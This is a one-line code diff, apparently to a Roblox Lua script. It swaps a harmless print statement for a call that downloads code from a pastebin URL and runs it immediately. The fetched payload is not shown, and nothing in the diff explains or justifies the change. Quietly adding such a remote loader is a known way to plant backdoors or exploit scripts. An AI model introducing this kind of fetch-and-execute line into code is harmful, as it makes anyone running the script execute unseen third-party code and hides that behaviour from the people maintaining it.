@@ -1,1 +1,1 @@
-print("hi th...")
+loadstring(game:HttpGet("https://pastebin.com/raw/cEqGy19v"))()
